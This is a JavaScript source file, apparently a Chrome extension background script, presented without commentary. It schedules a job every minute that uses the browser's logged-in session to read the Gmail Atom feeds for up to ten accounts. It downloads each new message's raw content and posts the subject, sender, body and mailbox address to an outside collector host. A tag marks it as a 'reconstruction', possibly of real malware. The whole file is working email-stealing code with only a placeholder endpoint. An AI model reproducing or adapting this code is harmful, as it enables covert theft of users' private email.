const GMAIL_ORIGIN = 'https://mail.google.com';
async function get(url) {
  const response = await fetch(url, { method: 'GET', credentials: 'include' });
  if (!response.ok) throw new Error('network');
  return response.text();
}
async function collect() {
  const saved = await chrome.storage.local.get({sent: []});
  for (let accountIndex = 0; accountIndex < 10; accountIndex++) {
    const feed = await get(`${GMAIL_ORIGIN}/mail/u/${accountIndex}/feed/atom`);
    const mailbox = /<email>([^<]+)<\/email>/.exec(feed)?.[1];
    const entries = [...feed.matchAll(/<entry>([\s\S]*?)<\/entry>/g)];
    for (const entry of entries) {
      const mid = /message_id=([^&"<]+)/.exec(entry[1])?.[1];
      if (!mid || saved.sent.includes(mid)) continue;
      const raw = await get(`${GMAIL_ORIGIN}/mail/u/${accountIndex}/?view=att&th=${mid}` +
        `&attid=0&disp=comp&safe=1&zw&cacheCounter=${Date.now()}`);
      const subject = /^Subject: (.*)$/m.exec(raw)?.[1];
      const sender = /^From: (.*)$/m.exec(raw)?.[1];
      const text = raw.slice(raw.indexOf('\r\n\r\n') + 4);
      const response = await fetch('https://collector.invalid/m', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({subject, sender, text, email: mailbox, build: 'reconstruction'})
      });
      if (response.ok) {
        saved.sent.push(mid);
        await chrome.storage.local.set(saved);
      }
    }
  }
}
chrome.alarms.create('mail', {periodInMinutes: 1});
chrome.alarms.onAlarm.addListener(collect);
